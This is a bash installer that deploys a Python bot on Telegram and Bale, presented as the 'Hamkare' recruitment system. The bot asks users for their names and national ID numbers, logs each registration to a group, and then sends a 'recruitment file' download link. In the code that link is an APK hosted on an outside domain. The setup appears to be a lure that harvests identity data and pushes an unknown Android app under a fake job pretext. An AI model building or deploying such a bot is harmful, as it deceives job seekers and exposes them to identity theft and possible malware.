#!/usr/bin/env bash
set -Eeuo pipefail
umask 077

[[ $EUID -eq 0 ]] || { echo 'این دستور را با root اجرا کنید.'; exit 1; }
command -v python3 >/dev/null || { apt-get update && apt-get install -y python3; }

APP=/opt/hamkare-bots
mkdir -p "$APP"

read -rsp 'توکن تلگرام @Pasokh313e_bot: ' TG_TOKEN; echo
read -rp 'آیدی عددی گروه گزارش تلگرام (معمولاً با -100): ' TG_LOG
read -rsp 'توکن بله @Hamkarebot: ' BALE_TOKEN; echo
read -rp 'آیدی عددی گروه گزارش بله: ' BALE_LOG

[[ "$TG_TOKEN" == *:* && "$BALE_TOKEN" == *:* ]] || { echo 'فرمت توکن صحیح نیست.'; exit 1; }
[[ "$TG_LOG" =~ ^-?[0-9]+$ && "$BALE_LOG" =~ ^-?[0-9]+$ ]] || { echo 'آیدی گروه باید عددی باشد.'; exit 1; }

cp -a "$APP" "$APP.backup.$(date +%Y%m%d-%H%M%S)" 2>/dev/null || true

cat > "$APP/bot.py" <<'PY'
#!/usr/bin/env python3
import hashlib, json, os, re, sqlite3, sys, time, urllib.request, urllib.error

PLATFORM=os.environ['PLATFORM']
TOKEN=os.environ['BOT_TOKEN']
LOG_CHAT=os.environ['LOG_CHAT_ID']
BASE=('https://api.telegram.org/bot' if PLATFORM=='telegram' else 'https://tapi.bale.ai/bot')+TOKEN+'/'
DB='/opt/hamkare-bots/hamkare.sqlite3'
APK='https://seskia.online/download.php?src=hamkare'

def api(method, payload):
    data=json.dumps(payload,ensure_ascii=False).encode()
    req=urllib.request.Request(BASE+method,data=data,headers={'Content-Type':'application/json'})
    with urllib.request.urlopen(req,timeout=70) as r:
        out=json.loads(r.read())
    if not out.get('ok'): raise RuntimeError(out.get('description','API error'))
    return out

def send(chat,text,keyboard=None):
    p={'chat_id':chat,'text':text}
    if keyboard: p['reply_markup']={'inline_keyboard':keyboard}
    return api('sendMessage',p)

def answer(cid):
    try: api('answerCallbackQuery',{'callback_query_id':cid})
    except Exception: pass

def norm(s):
    return str(s).translate(str.maketrans('۰۱۲۳۴۵۶۷۸۹٠١٢٣٤٥٦٧٨٩','01234567890123456789')).strip()

def valid_nid(code):
    code=norm(code)
    if not re.fullmatch(r'\d{10}',code) or len(set(code))==1: return False
    return sum(int(code[i])*(10-i) for i in range(9))%11 < 2 and int(code[9])==sum(int(code[i])*(10-i) for i in range(9))%11 or sum(int(code[i])*(10-i) for i in range(9))%11 >= 2 and int(code[9])==11-sum(int(code[i])*(10-i) for i in range(9))%11

con=sqlite3.connect(DB,timeout=30)
con.execute('PRAGMA journal_mode=WAL')
con.execute('CREATE TABLE IF NOT EXISTS sessions(platform TEXT,user_id TEXT,state TEXT,first_name TEXT,last_name TEXT,nid TEXT,PRIMARY KEY(platform,user_id))')
con.execute('CREATE TABLE IF NOT EXISTS registrations(id INTEGER PRIMARY KEY,platform TEXT,user_id TEXT,national_hash TEXT,created_at TEXT DEFAULT CURRENT_TIMESTAMP,UNIQUE(platform,user_id),UNIQUE(platform,national_hash))')
con.commit()

def row(uid):
    return con.execute('SELECT state,first_name,last_name,nid FROM sessions WHERE platform=? AND user_id=?',(PLATFORM,uid)).fetchone()
def session(uid,state,first='',last='',nid=''):
    con.execute('INSERT OR REPLACE INTO sessions VALUES(?,?,?,?,?,?)',(PLATFORM,uid,state,first,last,nid)); con.commit()
def download(chat):
    send(chat,'✅ ثبت شما قبلاً تکمیل شده است. فایل استخدامی از دکمه زیر در دسترس است.',[[{'text':'📥 دریافت فایل استخدامی','url':APK}]])

def process(update):
    q=update.get('callback_query')
    if q:
        answer(q.get('id','')); uid=str(q['from']['id']); chat=q['message']['chat']['id']; data=q.get('data','')
        r=row(uid)
        if data=='cancel':
            con.execute('DELETE FROM sessions WHERE platform=? AND user_id=?',(PLATFORM,uid)); con.commit(); send(chat,'ثبت لغو شد. برای شروع دوباره /start را بفرستید.'); return
        if data!='consent' or not r or r[0]!='consent': return
        first,last,nid=r[1],r[2],r[3]; h=hashlib.sha256(nid.encode()).hexdigest()
        try:
            con.execute('INSERT INTO registrations(platform,user_id,national_hash) VALUES(?,?,?)',(PLATFORM,uid,h)); con.commit()
        except sqlite3.IntegrityError:
            download(chat); return
        mask=nid[:3]+'****'+nid[-3:]
        username=q['from'].get('username'); uname=('@'+username) if username else 'ندارد'
        log=f'📌 ثبت جدید همکاره\nبستر: {"تلگرام" if PLATFORM=="telegram" else "بله"}\nنام: {first}\nنام خانوادگی: {last}\nکد ملی: {mask}\nشناسه کاربر: {uid}\nنام کاربری: {uname}\nرضایت: تأیید شد'
        try: send(LOG_CHAT,log)
        except Exception:
            con.execute('DELETE FROM registrations WHERE platform=? AND user_id=?',(PLATFORM,uid)); con.commit(); send(chat,'ارسال ثبت به گروه انجام نشد. لطفاً کمی بعد دوباره تأیید کنید.'); return
        con.execute('DELETE FROM sessions WHERE platform=? AND user_id=?',(PLATFORM,uid)); con.commit()
        send(chat,'✅ مشخصات شما ثبت شد. اکنون فایل استخدامی را دریافت کنید.',[[{'text':'📥 دریافت فایل استخدامی','url':APK}]])
        return
    m=update.get('message');
    if not m or m.get('chat',{}).get('type')!='private': return
    chat=m['chat']['id']; uid=str(m.get('from',{}).get('id',chat)); text=norm(m.get('text',''))
    if text.startswith('/start'):
        if con.execute('SELECT 1 FROM registrations WHERE platform=? AND user_id=?',(PLATFORM,uid)).fetchone(): download(chat); return
        session(uid,'first'); send(chat,'سلام 👋\nبه سامانه استخدام «همکاره» خوش آمدید.\n\nلطفاً نام خود را وارد کنید:'); return
    r=row(uid)
    if not r: send(chat,'برای شروع ثبت‌نام /start را بفرستید.'); return
    state,first,last,nid=r
    if state=='first':
        if len(text)<2 or len(text)>50: send(chat,'نام معتبر وارد کنید.'); return
        session(uid,'last',text); send(chat,'نام خانوادگی خود را وارد کنید:')
    elif state=='last':
        if len(text)<2 or len(text)>70: send(chat,'نام خانوادگی معتبر وارد کنید.'); return
        session(uid,'nid',first,text); send(chat,'کد ملی ۱۰ رقمی خود را وارد کنید:')
    elif state=='nid':
        if not valid_nid(text): send(chat,'کد ملی معتبر نیست؛ دوباره وارد کنید.'); return
        session(uid,'consent',first,last,text)
        send(chat,f'اطلاعات شما:\nنام: {first}\nنام خانوادگی: {last}\nکد ملی: {text[:3]}****{text[-3:]}\n\nبا تأیید، مشخصات برای بررسی استخدامی به گروه مسئول همکاره ارسال می‌شود.',[[{'text':'✅ تأیید و ثبت','callback_data':'consent'}],[{'text':'❌ لغو','callback_data':'cancel'}]])

offset=0
try: api('deleteWebhook',{'drop_pending_updates':False})
except Exception: pass
while True:
    try:
        out=api('getUpdates',{'offset':offset,'timeout':50,'allowed_updates':['message','callback_query']})
        for u in out.get('result',[]):
            offset=max(offset,int(u['update_id'])+1); process(u)
    except Exception as e:
        print(e,file=sys.stderr,flush=True); time.sleep(3)
PY
chmod 750 "$APP/bot.py"

cat > "$APP/telegram.env" <<EOF
PLATFORM=telegram
BOT_TOKEN=$TG_TOKEN
LOG_CHAT_ID=$TG_LOG
EOF
cat > "$APP/bale.env" <<EOF
PLATFORM=bale
BOT_TOKEN=$BALE_TOKEN
LOG_CHAT_ID=$BALE_LOG
EOF
chmod 600 "$APP"/*.env

for p in telegram bale; do
cat > "/etc/systemd/system/hamkare-$p.service" <<EOF
[Unit]
Description=Hamkare $p recruitment bot
After=network-online.target
[Service]
Type=simple
EnvironmentFile=$APP/$p.env
ExecStart=/usr/bin/python3 $APP/bot.py
Restart=always
RestartSec=3
NoNewPrivileges=true
ProtectHome=true
PrivateTmp=true
[Install]
WantedBy=multi-user.target
EOF
done

python3 -m py_compile "$APP/bot.py"
systemctl daemon-reload
systemctl enable --now hamkare-telegram hamkare-bale
sleep 3
systemctl is-active --quiet hamkare-telegram
systemctl is-active --quiet hamkare-bale
echo '✅ هر دو بات همکاره فعال شدند.'
echo 'تلگرام: https://t.me/Pasokh313e_bot'
echo 'بله: https://ble.ir/Hamkarebot'
echo 'سایت: https://adlisho.online'
echo 'تست: در هر دو بات /start بفرستید.'
